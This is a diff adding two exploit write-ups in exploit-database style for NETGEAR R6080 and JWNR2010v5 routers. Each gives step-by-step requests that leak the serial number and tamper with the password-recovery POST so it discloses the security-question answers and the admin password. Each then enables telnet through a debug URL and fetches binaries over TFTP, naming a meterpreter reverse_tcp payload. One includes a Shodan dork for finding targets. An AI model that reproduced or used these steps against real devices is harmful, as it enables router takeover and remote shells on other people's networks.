@@ -1,0 +1,78 @@
+# Exploit Title: NETGEAR WiFi Router R6080 - Security Questions Answers Disclosure
+# Date: 13/07/2019
+# Exploit Author: Wadeek
+# Hardware Version: R6080-100PES
+# Firmware Version: 1.0.0.34 / 1.0.0.40
+# Vendor Homepage: https://www.netgear.com/support/product/R6080.aspx
+# Firmware Link: http://www.downloads.netgear.com/files/GDC/R6080/(R6080-V1.0.0.34.zip or R6080-V1.0.0.40.zip)
+
+== Files Containing Juicy Info ==
+>> http://192.168.1.1/currentsetting.htm
+Firmware=V1.0.0.34WW
+Model=R6080
+>> http://192.168.1.1:56688/rootDesc.xml (Server: Unspecified, UPnP/1.0, Unspecified)
+<serialNumber>SSSSSSSNNNNNN</serialNumber>
+
+== Security Questions Bypass > Answers Disclosure ==
+>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
+<POST REQUEST>
+htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
+(replace)
+dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
+(by)
+dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=
+<POST RESPONSE>
+<input type="text" maxLength="64" size="30" name="answer1" onFocus="this.select();" value="AnSw3R-1">
+<input type="text" maxLength="64" size="30" name="answer2" onFocus="this.select();" value="AnSw3R-2">
+(repeat recovery process for get admin password)
+
+== Authenticated Telnet Command Execution ==
+>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug
+:~$ telnet 192.168.1.1
+R6080 login: admin
+Password: Str0nG-!P4ssW0rD
+{
+upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
+download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]
+}
+
+
+
+# Exploit Title: NETGEAR WiFi Router JWNR2010v5 - Security Questions Answers Disclosure
+# Date: 13/07/2019
+# Exploit Author: Wadeek
+# Hardware Version: JWNR2010v5
+# Firmware Version: 1.1.0.54
+# Vendor Homepage: https://www.netgear.com/support/product/JWNR2010v5.aspx
+# Firmware Link: http://www.downloads.netgear.com/files/GDC/JNR1010V2/N300-V1.1.0.54_1.0.1.zip
+# Shodan Dork: "HTTP/1.1 401 Unauthorized" "Set-Cookie: sessionid=" "NETGEAR JWNR2010v5"
+
+== Files Containing Juicy Info ==
+>> http://192.168.1.1/currentsetting.htm
+Firmware=V1.1.0.54
+Model=JWNR2010v5
+>> http://192.168.1.1/BRS_netgear_success.html (Serial Number)
+setTimeout('top.location.href = "http://www.netgear.com/success/JWNR2010v5.aspx?sn=SSSSSSSNNNNNN";',2000);
+
+== Security Questions Bypass > Answers Disclosure (only if "Password Recovery" is "Enable") ==
+>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
+<POST REQUEST>
+htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
+(replace)
+dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
+(by)
+dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=
+<POST RESPONSE>
+<input type="text" maxLength="64" size="30" name="htpwd_answer1" onFocus="this.select();" value="AnSw3R-1">
+<input type="text" maxLength="64" size="30" name="htpwd_answer2" onFocus="this.select();" value="AnSw3R-2">
+(repeat recovery process for get admin password)
+
+== Authenticated Telnet Command Execution ==
+>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug
+:~$ telnet 192.168.1.1
+JWNR2010v5 login: admin
+Password: Str0nG-!P4ssW0rD
+{
+upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
+download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]
+}
